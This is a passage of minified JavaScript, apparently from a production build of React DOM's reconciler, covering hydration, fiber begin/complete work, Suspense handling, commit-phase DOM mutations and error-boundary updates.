t=t[1],[No(Io.bind(null,t,e),[t,e]),n]}},Fo=null,Do=null,Uo=!1;function zo(e,t){var n=ns(5,null,null,0);n.elementType="DELETED",n.type="DELETED",n.stateNode=t,n.return=e,n.effectTag=8,null!==e.lastEffect?(e.lastEffect.nextEffect=n,e.lastEffect=n):e.firstEffect=e.lastEffect=n}function Ho(e,t){switch(e.tag){case 5:var n=e.type;return t=1!==t.nodeType||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t,null!==t&&(e.stateNode=t,!0);case 6:return t=""===e.pendingProps||3!==t.nodeType?null:t,null!==t&&(e.stateNode=t,!0);case 13:return!1;default:return!1}}function Bo(e){if(Uo){var t=Do;if(t){var n=t;if(!Ho(e,t)){if(t=_n(n.nextSibling),!t||!Ho(e,t))return e.effectTag=-1025&e.effectTag|2,Uo=!1,void(Fo=e);zo(Fo,n)}Fo=e,Do=_n(t.firstChild)}else e.effectTag=-1025&e.effectTag|2,Uo=!1,Fo=e}}function Wo(e){for(e=e.return;null!==e&&5!==e.tag&&3!==e.tag&&13!==e.tag;)e=e.return;Fo=e}function Vo(e){if(e!==Fo)return!1;if(!Uo)return Wo(e),Uo=!0,!1;var t=e.type;if(5!==e.tag||"head"!==t&&"body"!==t&&!In(t,e.memoizedProps))for(t=Do;t;)zo(e,t),t=_n(t.nextSibling);if(Wo(e),13===e.tag){if(e=e.memoizedState,e=null!==e?e.dehydrated:null,!e)throw Error(o(317));e:{for(e=e.nextSibling,t=0;e;){if(8===e.nodeType){var n=e.data;if(n===Cn){if(0===t){Do=_n(e.nextSibling);break e}t--}else n!==Sn&&n!==Ln&&n!==An||t++}e=e.nextSibling}Do=null}}else Do=Fo?_n(e.stateNode.nextSibling):null;return!0}function $o(){Do=Fo=null,Uo=!1}var Go=ee.ReactCurrentOwner,Xo=!1;function Qo(e,t,n,a){t.child=null===e?Bl(t,null,n,a):Hl(t,e.child,n,a)}function Ko(e,t,n,a,r){n=n.render;var l=t.ref;return yl(t,r),a=mo(e,t,n,a,l,r),null===e||Xo?(t.effectTag|=1,Qo(e,t,a,r),t.child):(t.updateQueue=e.updateQueue,t.effectTag&=-517,e.expirationTime<=r&&(e.expirationTime=0),pi(e,t,r))}function Jo(e,t,n,a,r,l){if(null===e){var o=n.type;return"function"!==typeof o||as(o)||void 0!==o.defaultProps||null!==n.compare||void 0!==n.defaultProps?(e=os(n.type,null,a,null,t.mode,l),e.ref=t.ref,e.return=t,t.child=e):(t.tag=15,t.type=o,Yo(e,t,o,a,r,l))}return o=e.child,r<l&&(r=o.memoizedProps,n=n.compare,n=null!==n?n:nr,n(r,a)&&e.ref===t.ref)?pi(e,t,l):(t.effectTag|=1,e=ls(o,a),e.ref=t.ref,e.return=t,t.child=e)}function Yo(e,t,n,a,r,l){return null!==e&&nr(e.memoizedProps,a)&&e.ref===t.ref&&(Xo=!1,r<l)?(t.expirationTime=e.expirationTime,pi(e,t,l)):ei(e,t,n,a,l)}function Zo(e,t){var n=t.ref;(null===e&&null!==n||null!==e&&e.ref!==n)&&(t.effectTag|=128)}function ei(e,t,n,a,r){var l=Pr(n)?Or:Tr.current;return l=Ir(t,l),yl(t,r),n=mo(e,t,n,a,l,r),null===e||Xo?(t.effectTag|=1,Qo(e,t,n,r),t.child):(t.updateQueue=e.updateQueue,t.effectTag&=-517,e.expirationTime<=r&&(e.expirationTime=0),pi(e,t,r))}function ti(e,t,n,a,r){if(Pr(n)){var l=!0;Mr(t)}else l=!1;if(yl(t,r),null===t.stateNode)null!==e&&(e.alternate=null,t.alternate=null,t.effectTag|=2),_l(t,n,a),Ml(t,n,a,r),a=!0;else if(null===e){var o=t.stateNode,i=t.memoizedProps;o.props=i;var c=o.context,s=n.contextType;"object"===typeof s&&null!==s?s=kl(s):(s=Pr(n)?Or:Tr.current,s=Ir(t,s));var u=n.getDerivedStateFromProps,d="function"===typeof u||"function"===typeof o.getSnapshotBeforeUpdate;d||"function"!==typeof o.UNSAFE_componentWillReceiveProps&&"function"!==typeof o.componentWillReceiveProps||(i!==a||c!==s)&&ql(t,o,a,s),wl=!1;var m=t.memoizedState;o.state=m,Ll(t,a,o,r),c=t.memoizedState,i!==a||m!==c||Nr.current||wl?("function"===typeof u&&(Il(t,n,u,a),c=t.memoizedState),(i=wl||Rl(t,n,i,a,m,c,s))?(d||"function"!==typeof o.UNSAFE_componentWillMount&&"function"!==typeof o.componentWillMount||("function"===typeof o.componentWillMount&&o.componentWillMount(),"function"===typeof o.UNSAFE_componentWillMount&&o.UNSAFE_componentWillMount()),"function"===typeof o.componentDidMount&&(t.effectTag|=4)):("function"===typeof o.componentDidMount&&(t.effectTag|=4),t.memoizedProps=a,t.memoizedState=c),o.props=a,o.state=c,o.context=s,a=i):("function"===typeof o.componentDidMount&&(t.effectTag|=4),a=!1)}else o=t.stateNode,jl(e,t),i=t.memoizedProps,o.props=t.type===t.elementType?i:ml(t.type,i),c=o.context,s=n.contextType,"object"===typeof s&&null!==s?s=kl(s):(s=Pr(n)?Or:Tr.current,s=Ir(t,s)),u=n.getDerivedStateFromProps,(d="function"===typeof u||"function"===typeof o.getSnapshotBeforeUpdate)||"function"!==typeof o.UNSAFE_componentWillReceiveProps&&"function"!==typeof o.componentWillReceiveProps||(i!==a||c!==s)&&ql(t,o,a,s),wl=!1,c=t.memoizedState,o.state=c,Ll(t,a,o,r),m=t.memoizedState,i!==a||c!==m||Nr.current||wl?("function"===typeof u&&(Il(t,n,u,a),m=t.memoizedState),(u=wl||Rl(t,n,i,a,c,m,s))?(d||"function"!==typeof o.UNSAFE_componentWillUpdate&&"function"!==typeof o.componentWillUpdate||("function"===typeof o.componentWillUpdate&&o.componentWillUpdate(a,m,s),"function"===typeof o.UNSAFE_componentWillUpdate&&o.UNSAFE_componentWillUpdate(a,m,s)),"function"===typeof o.componentDidUpdate&&(t.effectTag|=4),"function"===typeof o.getSnapshotBeforeUpdate&&(t.effectTag|=256)):("function"!==typeof o.componentDidUpdate||i===e.memoizedProps&&c===e.memoizedState||(t.effectTag|=4),"function"!==typeof o.getSnapshotBeforeUpdate||i===e.memoizedProps&&c===e.memoizedState||(t.effectTag|=256),t.memoizedProps=a,t.memoizedState=m),o.props=a,o.state=m,o.context=s,a=u):("function"!==typeof o.componentDidUpdate||i===e.memoizedProps&&c===e.memoizedState||(t.effectTag|=4),"function"!==typeof o.getSnapshotBeforeUpdate||i===e.memoizedProps&&c===e.memoizedState||(t.effectTag|=256),a=!1);return ni(e,t,n,a,l,r)}function ni(e,t,n,a,r,l){Zo(e,t);var o=0!==(64&t.effectTag);if(!a&&!o)return r&&Fr(t,n,!1),pi(e,t,l);a=t.stateNode,Go.current=t;var i=o&&"function"!==typeof n.getDerivedStateFromError?null:a.render();return t.effectTag|=1,null!==e&&o?(t.child=Hl(t,e.child,null,l),t.child=Hl(t,null,i,l)):Qo(e,t,i,l),t.memoizedState=a.state,r&&Fr(t,n,!0),t.child}function ai(e){var t=e.stateNode;t.pendingContext?_r(e,t.pendingContext,t.pendingContext!==t.context):t.context&&_r(e,t.context,!1),Ql(e,t.containerInfo)}var ri,li,oi,ii,ci={dehydrated:null,retryTime:0};function si(e,t,n){var a,r=t.mode,l=t.pendingProps,o=Zl.current,i=!1;if((a=0!==(64&t.effectTag))||(a=0!==(2&o)&&(null===e||null!==e.memoizedState)),a?(i=!0,t.effectTag&=-65):null!==e&&null===e.memoizedState||void 0===l.fallback||!0===l.unstable_avoidThisFallback||(o|=1),Ar(Zl,1&o),null===e){if(void 0!==l.fallback&&Bo(t),i){if(i=l.fallback,l=is(null,r,0,null),l.return=t,0===(2&t.mode))for(e=null!==t.memoizedState?t.child.child:t.child,l.child=e;null!==e;)e.return=l,e=e.sibling;return n=is(i,r,n,null),n.return=t,l.sibling=n,t.memoizedState=ci,t.child=l,n}return r=l.children,t.memoizedState=null,t.child=Bl(t,null,r,n)}if(null!==e.memoizedState){if(e=e.child,r=e.sibling,i){if(l=l.fallback,n=ls(e,e.pendingProps),n.return=t,0===(2&t.mode)&&(i=null!==t.memoizedState?t.child.child:t.child,i!==e.child))for(n.child=i;null!==i;)i.return=n,i=i.sibling;return r=ls(r,l),r.return=t,n.sibling=r,n.childExpirationTime=0,t.memoizedState=ci,t.child=n,r}return n=Hl(t,e.child,l.children,n),t.memoizedState=null,t.child=n}if(e=e.child,i){if(i=l.fallback,l=is(null,r,0,null),l.return=t,l.child=e,null!==e&&(e.return=l),0===(2&t.mode))for(e=null!==t.memoizedState?t.child.child:t.child,l.child=e;null!==e;)e.return=l,e=e.sibling;return n=is(i,r,n,null),n.return=t,l.sibling=n,n.effectTag|=2,l.childExpirationTime=0,t.memoizedState=ci,t.child=l,n}return t.memoizedState=null,t.child=Hl(t,e,l.children,n)}function ui(e,t){e.expirationTime<t&&(e.expirationTime=t);var n=e.alternate;null!==n&&n.expirationTime<t&&(n.expirationTime=t),vl(e.return,t)}function di(e,t,n,a,r,l){var o=e.memoizedState;null===o?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:a,tail:n,tailExpiration:0,tailMode:r,lastEffect:l}:(o.isBackwards=t,o.rendering=null,o.renderingStartTime=0,o.last=a,o.tail=n,o.tailExpiration=0,o.tailMode=r,o.lastEffect=l)}function mi(e,t,n){var a=t.pendingProps,r=a.revealOrder,l=a.tail;if(Qo(e,t,a.children,n),a=Zl.current,0!==(2&a))a=1&a|2,t.effectTag|=64;else{if(null!==e&&0!==(64&e.effectTag))e:for(e=t.child;null!==e;){if(13===e.tag)null!==e.memoizedState&&ui(e,n);else if(19===e.tag)ui(e,n);else if(null!==e.child){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;null===e.sibling;){if(null===e.return||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}a&=1}if(Ar(Zl,a),0===(2&t.mode))t.memoizedState=null;else switch(r){case"forwards":for(n=t.child,r=null;null!==n;)e=n.alternate,null!==e&&null===eo(e)&&(r=n),n=n.sibling;n=r,null===n?(r=t.child,t.child=null):(r=n.sibling,n.sibling=null),di(t,!1,r,n,l,t.lastEffect);break;case"backwards":for(n=null,r=t.child,t.child=null;null!==r;){if(e=r.alternate,null!==e&&null===eo(e)){t.child=r;break}e=r.sibling,r.sibling=n,n=r,r=e}di(t,!0,n,null,l,t.lastEffect);break;case"together":di(t,!1,null,null,void 0,t.lastEffect);break;default:t.memoizedState=null}return t.child}function pi(e,t,n){null!==e&&(t.dependencies=e.dependencies);var a=t.expirationTime;if(0!==a&&Mc(a),t.childExpirationTime<n)return null;if(null!==e&&t.child!==e.child)throw Error(o(153));if(null!==t.child){for(e=t.child,n=ls(e,e.pendingProps),t.child=n,n.return=t;null!==e.sibling;)e=e.sibling,n=n.sibling=ls(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function hi(e,t){switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;null!==t;)null!==t.alternate&&(n=t),t=t.sibling;null===n?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var a=null;null!==n;)null!==n.alternate&&(a=n),n=n.sibling;null===a?t||null===e.tail?e.tail=null:e.tail.sibling=null:a.sibling=null}}function gi(e,t,n){var a=t.pendingProps;switch(t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return null;case 1:return Pr(t.type)&&Rr(),null;case 3:return Kl(),Cr(Nr),Cr(Tr),n=t.stateNode,n.pendingContext&&(n.context=n.pendingContext,n.pendingContext=null),null!==e&&null!==e.child||!Vo(t)||(t.effectTag|=4),li(t),null;case 5:Yl(t),n=Xl(Gl.current);var l=t.type;if(null!==e&&null!=t.stateNode)oi(e,t,l,a,n),e.ref!==t.ref&&(t.effectTag|=128);else{if(!a){if(null===t.stateNode)throw Error(o(166));return null}if(e=Xl(Vl.current),Vo(t)){a=t.stateNode,l=t.type;var i=t.memoizedProps;switch(a[Fn]=t,a[Dn]=i,l){case"iframe":case"object":case"embed":nn("load",a);break;case"video":case"audio":for(e=0;e<nt.length;e++)nn(nt[e],a);break;case"source":nn("error",a);break;case"img":case"image":case"link":nn("error",a),nn("load",a);break;case"form":nn("reset",a),nn("submit",a);break;case"details":nn("toggle",a);break;case"input":Te(a,i),nn("invalid",a),En(n,"onChange");break;case"select":a._wrapperState={wasMultiple:!!i.multiple},nn("invalid",a),En(n,"onChange");break;case"textarea":Fe(a,i),nn("invalid",a),En(n,"onChange")}for(var c in hn(l,i),e=null,i)if(i.hasOwnProperty(c)){var s=i[c];"children"===c?"string"===typeof s?a.textContent!==s&&(e=["children",s]):"number"===typeof s&&a.textContent!==""+s&&(e=["children",""+s]):S.hasOwnProperty(c)&&null!=s&&En(n,c)}switch(l){case"input":Ce(a),Ie(a,i,!0);break;case"textarea":Ce(a),Ue(a);break;case"select":case"option":break;default:"function"===typeof i.onClick&&(a.onclick=bn)}n=e,t.updateQueue=n,null!==n&&(t.effectTag|=4)}else{switch(c=9===n.nodeType?n:n.ownerDocument,e===fn&&(e=He(l)),e===fn?"script"===l?(e=c.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):"string"===typeof a.is?e=c.createElement(l,{is:a.is}):(e=c.createElement(l),"select"===l&&(c=e,a.multiple?c.multiple=!0:a.size&&(c.size=a.size))):e=c.createElementNS(e,l),e[Fn]=t,e[Dn]=a,ri(e,t,!1,!1),t.stateNode=e,c=gn(l,a),l){case"iframe":case"object":case"embed":nn("load",e),s=a;break;case"video":case"audio":for(s=0;s<nt.length;s++)nn(nt[s],e);s=a;break;case"source":nn("error",e),s=a;break;case"img":case"image":case"link":nn("error",e),nn("load",e),s=a;break;case"form":nn("reset",e),nn("submit",e),s=a;break;case"details":nn("toggle",e),s=a;break;case"input":Te(e,a),s=Le(e,a),nn("invalid",e),En(n,"onChange");break;case"option":s=_e(e,a);break;case"select":e._wrapperState={wasMultiple:!!a.multiple},s=r({},a,{value:void 0}),nn("invalid",e),En(n,"onChange");break;case"textarea":Fe(e,a),s=Me(e,a),nn("invalid",e),En(n,"onChange");break;default:s=a}hn(l,s);var u=s;for(i in u)if(u.hasOwnProperty(i)){var d=u[i];"style"===i?mn(e,d):"dangerouslySetInnerHTML"===i?(d=d?d.__html:void 0,null!=d&&Ve(e,d)):"children"===i?"string"===typeof d?("textarea"!==l||""!==d)&&$e(e,d):"number"===typeof d&&$e(e,""+d):"suppressContentEditableWarning"!==i&&"suppressHydrationWarning"!==i&&"autoFocus"!==i&&(S.hasOwnProperty(i)?null!=d&&En(n,i):null!=d&&te(e,i,d,c))}switch(l){case"input":Ce(e),Ie(e,a,!1);break;case"textarea":Ce(e),Ue(e);break;case"option":null!=a.value&&e.setAttribute("value",""+xe(a.value));break;case"select":e.multiple=!!a.multiple,n=a.value,null!=n?qe(e,!!a.multiple,n,!1):null!=a.defaultValue&&qe(e,!!a.multiple,a.defaultValue,!0);break;default:"function"===typeof s.onClick&&(e.onclick=bn)}On(l,a)&&(t.effectTag|=4)}null!==t.ref&&(t.effectTag|=128)}return null;case 6:if(e&&null!=t.stateNode)ii(e,t,e.memoizedProps,a);else{if("string"!==typeof a&&null===t.stateNode)throw Error(o(166));n=Xl(Gl.current),Xl(Vl.current),Vo(t)?(n=t.stateNode,a=t.memoizedProps,n[Fn]=t,n.nodeValue!==a&&(t.effectTag|=4)):(n=(9===n.nodeType?n:n.ownerDocument).createTextNode(a),n[Fn]=t,t.stateNode=n)}return null;case 13:return Cr(Zl),a=t.memoizedState,0!==(64&t.effectTag)?(t.expirationTime=n,t):(n=null!==a,a=!1,null===e?void 0!==t.memoizedProps.fallback&&Vo(t):(l=e.memoizedState,a=null!==l,n||null===l||(l=e.child.sibling,null!==l&&(i=t.firstEffect,null!==i?(t.firstEffect=l,l.nextEffect=i):(t.firstEffect=t.lastEffect=l,l.nextEffect=null),l.effectTag=8))),n&&!a&&0!==(2&t.mode)&&(null===e&&!0!==t.memoizedProps.unstable_avoidThisFallback||0!==(1&Zl.current)?nc===$i&&(nc=Qi):(nc!==$i&&nc!==Qi||(nc=Ki),0!==ic&&null!==Zi&&(ms(Zi,tc),ps(Zi,ic)))),(n||a)&&(t.effectTag|=4),null);case 4:return Kl(),li(t),null;case 10:return bl(t),null;case 17:return Pr(t.type)&&Rr(),null;case 19:if(Cr(Zl),a=t.memoizedState,null===a)return null;if(l=0!==(64&t.effectTag),i=a.rendering,null===i){if(l)hi(a,!1);else if(nc!==$i||null!==e&&0!==(64&e.effectTag))for(i=t.child;null!==i;){if(e=eo(i),null!==e){for(t.effectTag|=64,hi(a,!1),l=e.updateQueue,null!==l&&(t.updateQueue=l,t.effectTag|=4),null===a.lastEffect&&(t.firstEffect=null),t.lastEffect=a.lastEffect,a=t.child;null!==a;)l=a,i=n,l.effectTag&=2,l.nextEffect=null,l.firstEffect=null,l.lastEffect=null,e=l.alternate,null===e?(l.childExpirationTime=0,l.expirationTime=i,l.child=null,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null):(l.childExpirationTime=e.childExpirationTime,l.expirationTime=e.expirationTime,l.child=e.child,l.memoizedProps=e.memoizedProps,l.memoizedState=e.memoizedState,l.updateQueue=e.updateQueue,i=e.dependencies,l.dependencies=null===i?null:{expirationTime:i.expirationTime,firstContext:i.firstContext,responders:i.responders}),a=a.sibling;return Ar(Zl,1&Zl.current|2),t.child}i=i.sibling}}else{if(!l)if(e=eo(i),null!==e){if(t.effectTag|=64,l=!0,n=e.updateQueue,null!==n&&(t.updateQueue=n,t.effectTag|=4),hi(a,!0),null===a.tail&&"hidden"===a.tailMode&&!i.alternate)return t=t.lastEffect=a.lastEffect,null!==t&&(t.nextEffect=null),null}else 2*al()-a.renderingStartTime>a.tailExpiration&&1<n&&(t.effectTag|=64,l=!0,hi(a,!1),t.expirationTime=t.childExpirationTime=n-1);a.isBackwards?(i.sibling=t.child,t.child=i):(n=a.last,null!==n?n.sibling=i:t.child=i,a.last=i)}return null!==a.tail?(0===a.tailExpiration&&(a.tailExpiration=al()+500),n=a.tail,a.rendering=n,a.tail=n.sibling,a.lastEffect=t.lastEffect,a.renderingStartTime=al(),n.sibling=null,t=Zl.current,Ar(Zl,l?1&t|2:1&t),n):null}throw Error(o(156,t.tag))}function fi(e){switch(e.tag){case 1:Pr(e.type)&&Rr();var t=e.effectTag;return 4096&t?(e.effectTag=-4097&t|64,e):null;case 3:if(Kl(),Cr(Nr),Cr(Tr),t=e.effectTag,0!==(64&t))throw Error(o(285));return e.effectTag=-4097&t|64,e;case 5:return Yl(e),null;case 13:return Cr(Zl),t=e.effectTag,4096&t?(e.effectTag=-4097&t|64,e):null;case 19:return Cr(Zl),null;case 4:return Kl(),null;case 10:return bl(e),null;default:return null}}function Ei(e,t){return{value:e,source:t,stack:we(t)}}ri=function(e,t){for(var n=t.child;null!==n;){if(5===n.tag||6===n.tag)e.appendChild(n.stateNode);else if(4!==n.tag&&null!==n.child){n.child.return=n,n=n.child;continue}if(n===t)break;for(;null===n.sibling;){if(null===n.return||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}},li=function(){},oi=function(e,t,n,a,l){var o=e.memoizedProps;if(o!==a){var i,c,s=t.stateNode;switch(Xl(Vl.current),e=null,n){case"input":o=Le(s,o),a=Le(s,a),e=[];break;case"option":o=_e(s,o),a=_e(s,a),e=[];break;case"select":o=r({},o,{value:void 0}),a=r({},a,{value:void 0}),e=[];break;case"textarea":o=Me(s,o),a=Me(s,a),e=[];break;default:"function"!==typeof o.onClick&&"function"===typeof a.onClick&&(s.onclick=bn)}for(i in hn(n,a),n=null,o)if(!a.hasOwnProperty(i)&&o.hasOwnProperty(i)&&null!=o[i])if("style"===i)for(c in s=o[i],s)s.hasOwnProperty(c)&&(n||(n={}),n[c]="");else"dangerouslySetInnerHTML"!==i&&"children"!==i&&"suppressContentEditableWarning"!==i&&"suppressHydrationWarning"!==i&&"autoFocus"!==i&&(S.hasOwnProperty(i)?e||(e=[]):(e=e||[]).push(i,null));for(i in a){var u=a[i];if(s=null!=o?o[i]:void 0,a.hasOwnProperty(i)&&u!==s&&(null!=u||null!=s))if("style"===i)if(s){for(c in s)!s.hasOwnProperty(c)||u&&u.hasOwnProperty(c)||(n||(n={}),n[c]="");for(c in u)u.hasOwnProperty(c)&&s[c]!==u[c]&&(n||(n={}),n[c]=u[c])}else n||(e||(e=[]),e.push(i,n)),n=u;else"dangerouslySetInnerHTML"===i?(u=u?u.__html:void 0,s=s?s.__html:void 0,null!=u&&s!==u&&(e=e||[]).push(i,u)):"children"===i?s===u||"string"!==typeof u&&"number"!==typeof u||(e=e||[]).push(i,""+u):"suppressContentEditableWarning"!==i&&"suppressHydrationWarning"!==i&&(S.hasOwnProperty(i)?(null!=u&&En(l,i),e||s===u||(e=[])):(e=e||[]).push(i,u))}n&&(e=e||[]).push("style",n),l=e,(t.updateQueue=l)&&(t.effectTag|=4)}},ii=function(e,t,n,a){n!==a&&(t.effectTag|=4)};var bi="function"===typeof WeakSet?WeakSet:Set;function vi(e,t){var n=t.source,a=t.stack;null===a&&null!==n&&(a=we(n)),null!==n&&ke(n.type),t=t.value,null!==e&&1===e.tag&&ke(e.type);try{console.error(t)}catch(r){setTimeout((function(){throw r}))}}function yi(e,t){try{t.props=e.memoizedProps,t.state=e.memoizedState,t.componentWillUnmount()}catch(n){Qc(e,n)}}function ki(e){var t=e.ref;if(null!==t)if("function"===typeof t)try{t(null)}catch(n){Qc(e,n)}else t.current=null}function wi(e,t){switch(t.tag){case 0:case 11:case 15:case 22:return;case 1:if(256&t.effectTag&&null!==e){var n=e.memoizedProps,a=e.memoizedState;e=t.stateNode,t=e.getSnapshotBeforeUpdate(t.elementType===t.type?n:ml(t.type,n),a),e.__reactInternalSnapshotBeforeUpdate=t}return;case 3:case 5:case 6:case 4:case 17:return}throw Error(o(163))}function xi(e,t){if(t=t.updateQueue,t=null!==t?t.lastEffect:null,null!==t){var n=t=t.next;do{if((n.tag&e)===e){var a=n.destroy;n.destroy=void 0,void 0!==a&&a()}n=n.next}while(n!==t)}}function ji(e,t){if(t=t.updateQueue,t=null!==t?t.lastEffect:null,null!==t){var n=t=t.next;do{if((n.tag&e)===e){var a=n.create;n.destroy=a()}n=n.next}while(n!==t)}}function Si(e,t,n){switch(n.tag){case 0:case 11:case 15:case 22:return void ji(3,n);case 1:if(e=n.stateNode,4&n.effectTag)if(null===t)e.componentDidMount();else{var a=n.elementType===n.type?t.memoizedProps:ml(n.type,t.memoizedProps);e.componentDidUpdate(a,t.memoizedState,e.__reactInternalSnapshotBeforeUpdate)}return t=n.updateQueue,void(null!==t&&Tl(n,t,e));case 3:if(t=n.updateQueue,null!==t){if(e=null,null!==n.child)switch(n.child.tag){case 5:e=n.child.stateNode;break;case 1:e=n.child.stateNode}Tl(n,t,e)}return;case 5:return e=n.stateNode,void(null===t&&4&n.effectTag&&On(n.type,n.memoizedProps)&&e.focus());case 6:return;case 4:return;case 12:return;case 13:return void(null===n.memoizedState&&(n=n.alternate,null!==n&&(n=n.memoizedState,null!==n&&(n=n.dehydrated,null!==n&&Vt(n)))));case 19:case 17:case 20:case 21:return}throw Error(o(163))}function Ci(e,t,n){switch("function"===typeof Zc&&Zc(t),t.tag){case 0:case 11:case 14:case 15:case 22:if(e=t.updateQueue,null!==e&&(e=e.lastEffect,null!==e)){var a=e.next;ol(97<n?97:n,(function(){var e=a;do{var n=e.destroy;if(void 0!==n){var r=t;try{n()}catch(l){Qc(r,l)}}e=e.next}while(e!==a)}))}break;case 1:ki(t),n=t.stateNode,"function"===typeof n.componentWillUnmount&&yi(t,n);break;case 5:ki(t);break;case 4:Ii(e,t,n)}}function Ai(e){var t=e.alternate;e.return=null,e.child=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.alternate=null,e.firstEffect=null,e.lastEffect=null,e.pendingProps=null,e.memoizedProps=null,e.stateNode=null,null!==t&&Ai(t)}function Li(e){return 5===e.tag||3===e.tag||4===e.tag}function Ti(e){e:{for(var t=e.return;null!==t;){if(Li(t)){var n=t;break e}t=t.return}throw Error(o(160))}switch(t=n.stateNode,n.tag){case 5:var a=!1;break;case 3:t=t.containerInfo,a=!0;break;case 4:t=t.containerInfo,a=!0;break;default:throw Error(o(161))}16&n.effectTag&&($e(t,""),n.effectTag&=-17);e:t:for(n=e;;){for(;null===n.sibling;){if(null===n.return||Li(n.return)){n=null;break e}n=n.return}for(n.sibling.return=n.return,n=n.sibling;5!==n.tag&&6!==n.tag&&18!==n.tag;){if(2&n.effectTag)continue t;if(null===n.child||4===n.tag)continue t;n.child.return=n,n=n.child}if(!(2&n.effectTag)){n=n.stateNode;break e}}a?Ni(e,n,t):Oi(e,n,t)}function Ni(e,t,n){var a=e.tag,r=5===a||6===a;if(r)e=r?e.stateNode:e.stateNode.instance,t?8===n.nodeType?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(8===n.nodeType?(t=n.parentNode,t.insertBefore(e,n)):(t=n,t.appendChild(e)),n=n._reactRootContainer,null!==n&&void 0!==n||null!==t.onclick||(t.onclick=bn));else if(4!==a&&(e=e.child,null!==e))for(Ni(e,t,n),e=e.sibling;null!==e;)Ni(e,t,n),e=e.sibling}function Oi(e,t,n){var a=e.tag,r=5===a||6===a;if(r)e=r?e.stateNode:e.stateNode.instance,t?n.insertBefore(e,t):n.appendChild(e);else if(4!==a&&(e=e.child,null!==e))for(Oi(e,t,n),e=e.sibling;null!==e;)Oi(e,t,n),e=e.sibling}function Ii(e,t,n){for(var a,r,l=t,i=!1;;){if(!i){i=l.return;e:for(;;){if(null===i)throw Error(o(160));switch(a=i.stateNode,i.tag){case 5:r=!1;break e;case 3:a=a.containerInfo,r=!0;break e;case 4:a=a.containerInfo,r=!0;break e}i=i.return}i=!0}if(5===l.tag||6===l.tag){e:for(var c=e,s=l,u=n,d=s;;)if(Ci(c,d,u),null!==d.child&&4!==d.tag)d.child.return=d,d=d.child;else{if(d===s)break e;for(;null===d.sibling;){if(null===d.return||d.return===s)break e;d=d.return}d.sibling.return=d.return,d=d.sibling}r?(c=a,s=l.stateNode,8===c.nodeType?c.parentNode.removeChild(s):c.removeChild(s)):a.removeChild(l.stateNode)}else if(4===l.tag){if(null!==l.child){a=l.stateNode.containerInfo,r=!0,l.child.return=l,l=l.child;continue}}else if(Ci(e,l,n),null!==l.child){l.child.return=l,l=l.child;continue}if(l===t)break;for(;null===l.sibling;){if(null===l.return||l.return===t)return;l=l.return,4===l.tag&&(i=!1)}l.sibling.return=l.return,l=l.sibling}}function Pi(e,t){switch(t.tag){case 0:case 11:case 14:case 15:case 22:return void xi(3,t);case 1:return;case 5:var n=t.stateNode;if(null!=n){var a=t.memoizedProps,r=null!==e?e.memoizedProps:a;e=t.type;var l=t.updateQueue;if(t.updateQueue=null,null!==l){for(n[Dn]=a,"input"===e&&"radio"===a.type&&null!=a.name&&Ne(n,a),gn(e,r),t=gn(e,a),r=0;r<l.length;r+=2){var i=l[r],c=l[r+1];"style"===i?mn(n,c):"dangerouslySetInnerHTML"===i?Ve(n,c):"children"===i?$e(n,c):te(n,i,c,t)}switch(e){case"input":Oe(n,a);break;case"textarea":De(n,a);break;case"select":t=n._wrapperState.wasMultiple,n._wrapperState.wasMultiple=!!a.multiple,e=a.value,null!=e?qe(n,!!a.multiple,e,!1):t!==!!a.multiple&&(null!=a.defaultValue?qe(n,!!a.multiple,a.defaultValue,!0):qe(n,!!a.multiple,a.multiple?[]:"",!1))}}}return;case 6:if(null===t.stateNode)throw Error(o(162));return void(t.stateNode.nodeValue=t.memoizedProps);case 3:return t=t.stateNode,void(t.hydrate&&(t.hydrate=!1,Vt(t.containerInfo)));case 12:return;case 13:if(n=t,null===t.memoizedState?a=!1:(a=!0,n=t.child,sc=al()),null!==n)e:for(e=n;;){if(5===e.tag)l=e.stateNode,a?(l=l.style,"function"===typeof l.setProperty?l.setProperty("display","none","important"):l.display="none"):(l=e.stateNode,r=e.memoizedProps.style,r=void 0!==r&&null!==r&&r.hasOwnProperty("display")?r.display:null,l.style.display=dn("display",r));else if(6===e.tag)e.stateNode.nodeValue=a?"":e.memoizedProps;else{if(13===e.tag&&null!==e.memoizedState&&null===e.memoizedState.dehydrated){l=e.child.sibling,l.return=e,e=l;continue}if(null!==e.child){e.child.return=e,e=e.child;continue}}if(e===n)break;for(;null===e.sibling;){if(null===e.return||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}return void Ri(t);case 19:return void Ri(t);case 17:return}throw Error(o(163))}function Ri(e){var t=e.updateQueue;if(null!==t){e.updateQueue=null;var n=e.stateNode;null===n&&(n=e.stateNode=new bi),t.forEach((function(t){var a=Jc.bind(null,e,t);n.has(t)||(n.add(t),t.then(a,a))}))}}var _i="function"===typeof WeakMap?WeakMap:Map;function qi(e,t,n){n=Sl(n,null),n.tag=3,n.payload={element:null};var a=t.value;return n.callback=function(){mc||(mc=!0,pc=a),vi(e,t)},n}function Mi(e,t,n){n=Sl(n,null),n.tag=3;var a=e.type.getDerivedStateFromError;if("function"===typeof a){var r=t.value;n.payload=function(){return vi(e,t),a(r)}}var l=e.stateNode;return null!==l&&"function"===typeof l.componentDidCatch&&(n.callback=function(){"function"!==typeof a&&(null===hc?hc=new Set([this]):hc.add(this),vi(e,t));var n=t.stack;this.componentDidCatch(t.value,{componentStack:null!==n?n:""})}),n}var 